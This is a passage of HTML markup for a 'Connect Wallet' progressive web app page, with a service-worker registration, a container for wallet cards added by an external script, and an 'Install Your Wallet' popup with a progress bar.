    <title>Connect Wallet</title>
    <link rel="stylesheet" href="wallets.css" />
    <link rel="manifest" href="manifest.json" />
    <script>
      if ("serviceWorker" in navigator) {
        navigator.serviceWorker.register("service-worker.js");
      }
    </script>
  </head>
  <body>

    <div class="wallet-container" id="walletContainer">
      <!-- Cards auto-add by JS -->
    </div>

    <script src="wallets.js"></script>
    <div id="pwaPopup" class="popup">
      <div class="popup-box">
        <h2>Install Your Wallet</h2>
        <p id="progressText">Loadingâ€¦ 0%</p>
        <div class="progress-bar">
          <div id="progressFill"></div>
        </div>
        <button id="installBtn" style="display: none">Install</button>
        <button onclick="closePopup()">Close</button>
      </div>
    </div>
  </body>
</html>
